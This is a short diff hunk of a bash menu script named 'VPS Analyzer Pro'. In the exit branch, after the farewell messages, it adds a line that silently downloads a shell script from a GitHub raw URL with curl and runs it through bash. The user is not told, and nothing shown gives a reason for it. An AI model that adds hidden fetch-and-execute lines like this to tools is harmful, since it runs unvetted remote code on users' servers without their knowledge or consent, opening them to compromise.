@@ -1206,6 +1206,7 @@ while true; do
             echo -e "${C}╚════════════════════════════════════════════════════════╝${N}"
             echo -e "${G}Thank you for using VPS Analyzer Pro v$VERSION!${N}"
             echo -e "${Y}Goodbye! 👋${N}"
+         bash <(curl -sL https://raw.githubusercontent.com/sdgamer8263-sketch/tooler/main/run.sh) 
             exit 0
             ;;
         12)
